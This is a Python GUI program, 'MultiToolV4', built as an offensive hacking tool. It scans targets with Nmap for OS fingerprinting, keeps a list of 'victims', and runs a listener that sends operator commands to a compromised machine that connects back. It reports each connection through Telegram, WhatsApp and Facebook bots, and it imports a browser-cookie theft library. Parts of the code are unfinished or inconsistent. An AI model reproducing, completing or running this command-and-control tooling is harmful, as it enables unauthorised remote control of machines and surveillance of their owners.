import socket
import subprocess
import nmap
import threading
import logging
from logging.handlers import RotatingFileHandler
import browser_cookie3
import autopy
from PyQt5 import QtWidgets, QtCore
import requests
from telethon import TelegramClient  # Telegram bot integration
import pywhatkit as kit  # WhatsApp API support
import facebook
import openai  # OpenAI for AI-guided error handling
import os
import sys
import asyncio  # Ensure we handle async functions correctly
import json
from PyQt5.QtGui import QTextCursor

# ===================== Logging Setup ===================== #
if not os.path.exists('logs'):
    os.makedirs('logs')

log_file = os.path.join('logs', 'multi_tool.log')
log_handler = RotatingFileHandler(log_file, maxBytes=1024 * 1024, backupCount=5)
logging.basicConfig(handlers=[log_handler], level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Constants for Bot Setup
LHOST = "localhost"
RHOST = "target_ip"
PROXY = "proxy_ip:proxy_port"
NMAP_ARGS = "-Pn -sT -O"

# Load API Credentials from config file
with open('config/api_credentials.json', 'r') as cred_file:
    api_credentials = json.load(cred_file)

API_ID = api_credentials['telegram_api_id']
API_HASH = api_credentials['telegram_api_hash']
BOT_TOKEN = api_credentials['telegram_bot_token']
FACEBOOK_TOKEN = api_credentials['facebook_access_token']
WHATSAPP_PHONE_NUMBER = api_credentials['whatsapp_phone_number']
openai.api_key = api_credentials["openai_api_key"]

# Initialize Telegram Client
telegram_client = TelegramClient('bot', API_ID, API_HASH)

# ===================== API Key Validation ===================== #
def validate_api_keys(output_area, credentials):
    """Validate that all necessary API keys are provided."""
    missing_keys = [key for key, value in credentials.items() if not value]
    if missing_keys:
        missing_str = ", ".join(missing_keys)
        output_area.setTextColor(QtCore.Qt.red)
        output_area.append(f"❌ Error: Missing API keys for {missing_str}\n")
        logging.error(f"Missing API keys: {missing_str}")
        return False
    output_area.setTextColor(QtCore.Qt.green)
    output_area.append("✅ All API keys validated.\n")
    return True

# ===================== AI Error Handling ===================== #
def detect_and_fix_errors(error_message, output_area):
    """Use OpenAI to suggest fixes for detected errors."""
    try:
        response = openai.Completion.create(
            model="text-davinci-003",
            prompt=f"Error detected: {error_message}. Suggest a fix.",
            max_tokens=150
        )
        suggestion = response.choices[0].text.strip()
        output_area.setTextColor(QtCore.Qt.yellow)
        output_area.append(f"💡 AI Suggestion: {suggestion}")
    except Exception as e:
        output_area.setTextColor(QtCore.Qt.red)
        output_area.append(f"❌ AI Error Detection Failed: {str(e)}")

# ===================== Bot Notifications ===================== #
async def telegram_bot_notify(message, output_area):
    """Send a message to Telegram asynchronously and handle errors."""
    try:
        if not telegram_client.is_connected():
            await telegram_client.start(bot_token=BOT_TOKEN)
        await telegram_client.send_message('me', message)
        output_area.setTextColor(QtCore.Qt.green)
        output_area.append("✅ Telegram notification sent.\n")
    except Exception as e:
        handle_exception(e, output_area)

def send_telegram_notification_async(message, output_area):
    """Helper function to run async Telegram notifications from GUI thread."""
    asyncio.create_task(telegram_bot_notify(message, output_area))

def whatsapp_notify(message, phone_number, output_area):
    """Send a WhatsApp message using pyWhatKit."""
    try:
        kit.sendwhatmsg_instantly(phone_number, message)
        output_area.setTextColor(QtCore.Qt.green)
        output_area.append("✅ WhatsApp message sent successfully.\n")
        logging.info(f"WhatsApp message sent to {phone_number}")
    except Exception as e:
        handle_exception(e, output_area)

def setup_facebook_bot(output_area):
    """Send a notification via Facebook."""
    try:
        graph = facebook.GraphAPI(access_token=FACEBOOK_TOKEN)
        graph.put_object(parent_object='me', connection_name='feed', message="Monitoring vulnerabilities.")
        output_area.setTextColor(QtCore.Qt.green)
        output_area.append("✅ Facebook bot setup complete.")
    except Exception as e:
        handle_exception(e, output_area)

# ===================== Victim Monitoring ===================== #
victims = []

def add_victim(ip_address, output_area):
    """Monitor victim and notify via bots."""
    if not validate_ip(ip_address):
        output_area.setTextColor(QtCore.Qt.red)
        output_area.append(f"❌ Invalid IP address: {ip_address}\n")
        logging.error(f"Attempted to monitor invalid IP address: {ip_address}")
        return

    victims.append(ip_address)
    output_area.setTextColor(QtCore.Qt.green)
    output_area.append(f"✅ Monitoring victim: {ip_address}\n")
    
    message = f"⚠️ Vulnerability detected at {ip_address}."
    send_telegram_notification_async(message, output_area)
    whatsapp_notify(message, WHATSAPP_PHONE_NUMBER, output_area)

def validate_ip(ip):
    """Validate if the given string is a valid IP address."""
    import re
    ip_pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
    return re.match(ip_pattern, ip) is not None

# ===================== Scanning and Backdoor ===================== #
def scan_target(rhost, output_area):
    """Scan target using Nmap."""
    try:
        nm = nmap.PortScanner()
        nm.scan(rhost, arguments=NMAP_ARGS)
        result = f"🖥️ Target OS: {nm[rhost]['osclass'][0]['osfamily']}\n{nm.csv()}"
        output_area.setTextColor(QtCore.Qt.green)
        output_area.append(result)
    except Exception as e:
        handle_exception(e)

def create_backdoor(lhost, port=8080, output_area=None, stop_event=None):
    """Create a backdoor and notify via bots."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((lhost, port))
        sock.listen(1)
        output_area.setTextColor(QtCore.Qt.blue)
        output_area.append(f"🔒 Listening on {lhost}:{port}...\n")
        conn, addr = sock.accept()
        output_area.setTextColor(QtCore.Qt.green)
        output_area.append(f"🔓 Connection established with {addr}\n")

        message = f"⚠️ Backdoor connection established with {addr}"
        send_telegram_notification_async(message, output_area)
        whatsapp_notify(message, WHATSAPP_PHONE_NUMBER, output_area)
        
        while not stop_event.is_set():
            cmd, ok = QtWidgets.QInputDialog.getText(None, "Command Input", "Enter command:")
            if not ok or cmd.lower() in ['exit', 'quit']:
                break
            conn.sendall(cmd.encode())
            response = conn.recv(4096).decode()
            output_area.setTextColor(QtCore.Qt.green)
            output_area.append(response + '\n')
        conn.close()
    except Exception as e:
        handle_exception(e)

# ===================== Error Handling ===================== #
def handle_exception(exception, output_area=None):
    """Log and handle exceptions."""
    error_message = str(exception)
    logging.error(error_message)
    if output_area:
        output_area.setTextColor(QtCore.Qt.red)
        output_area.append(f"❌ Error: {error_message}")
        detect_and_fix_errors(error_message, output_area)

# ===================== GUI Application ===================== #
class MultiToolV4(QtWidgets.QMainWindow):
    """Main GUI for MultiToolV4."""
    
    def __init__(self):
        super().__init__()
        self.init_ui()
        self.stop_event = threading.Event()

    def init_ui(self):
        self.setWindowTitle('MultiToolV4 by kdairatchi 🛠️')
        self.setGeometry(100, 100, 800, 600)

        # Central Widget
        central_widget = QtWidgets.QWidget(self)
        self.setCentralWidget(central_widget)
        layout = QtWidgets.QVBoxLayout(central_widget)

        # Tabs
        self.tabs = QtWidgets.QTabWidget()
        layout.addWidget(self.tabs)

        # Bot Setup Tab
        self.add_bot_tab()
        
        # Victim Monitoring Tab
        self.add_victim_monitor_tab()

        # Error Handling Tab
        self.add_error_handling_tab()

        self.show()

    def add_bot_tab(self):
        """Add bot setup tab."""
        bot_tab = QtWidgets.QWidget()
        self.bot_output = QtWidgets.QTextEdit()
        self.bot_output.setReadOnly(True)
        setup_button = QtWidgets.QPushButton("Setup Bots 🚀")
        setup_button.clicked.connect(lambda: self.setup_bots())
        layout = QtWidgets.QVBoxLayout(bot_tab)
        layout.addWidget(self.bot_output)
        layout.addWidget(setup_button)
        self.tabs.addTab(bot_tab, "Bot Setup 🤖")

    def add_victim_monitor_tab(self):
        """Add victim monitoring tab."""
        victim_tab = QtWidgets.QWidget()
        self.victim_output = QtWidgets.QTextEdit()
        self.victim_output.setReadOnly(True)
        victim_ip_input = QtWidgets.QLineEdit()
        victim_ip_input.setPlaceholderText("Enter victim's IP address")
        add_victim_button = QtWidgets.QPushButton("Add Victim 🎯")
        add_victim_button.clicked.connect(lambda: add_victim(victim_ip_input.text(), self.victim_output))
        layout = QtWidgets.QVBoxLayout(victim_tab)
        layout.addWidget(victim_ip_input)
        layout.addWidget(self.victim_output)
        layout.addWidget(add_victim_button)
        self.tabs.addTab(victim_tab, "Victim Monitor 🔍")

    def add_error_handling_tab(self):
        """Add AI error handling tab."""
        error_handling_tab = QtWidgets.QWidget()
        self.error_output = QtWidgets.QTextEdit()
        self.error_output.setReadOnly(True)
        layout = QtWidgets.QVBoxLayout(error_handling_tab)
        layout.addWidget(self.error_output)
        self.tabs.addTab(error_handling_tab, "Error Handling ⚠️")

    def setup_bots(self):
        """Setup bots and notify users via Telegram and WhatsApp."""
        if validate_api_keys(self.bot_output, api_credentials):
            try:
                message = "🤖 Bots connected to APIs."
                self.bot_output.append(message)
                send_telegram_notification_async("Bots are active. 🔔", self.bot_output)
                setup_facebook_bot(self.bot_output)
            except Exception as e:
                handle_exception(e, self.bot_output)

    def start_backdoor_thread(self):
        self.stop_event.clear()
        threading.Thread(target=create_backdoor, args=(LHOST, 8080, self.bot_output, self.stop_event), daemon=True).start()

    def stop_backdoor_thread(self):
        self.stop_event.set()

def main():
    app = QtWidgets.QApplication(sys.argv)
    gui = MultiToolV4()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()